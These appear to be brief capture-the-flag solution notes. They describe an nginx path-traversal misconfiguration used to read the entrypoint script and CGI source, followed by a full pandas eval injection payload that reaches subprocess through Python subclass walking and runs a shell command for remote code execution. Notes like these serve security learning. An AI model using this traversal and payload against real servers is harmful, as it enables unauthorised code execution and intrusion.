# Steps

- nginx misconfig makes you able to get `URL/static../docker-entrypoint.sh`
- You can get the python cgi files `URL/static../cgi-bin/search-currency.py`
- You can achieve an rce via pandas dataframe and get the output. @pd.eval  

- `PyCGI: OBEL'or[].__class__.__base__.__subclasses__()[145].__init__([].__class__.__base__.__subclasses__()[145]).__class__.__name__<'1'or@server.add_body([].__class__.__base__.__subclasses__()[145]._module.sys.modules["subprocess"].check_output(["ls","-l", "/"]).decode()).__class__.__name__<'a
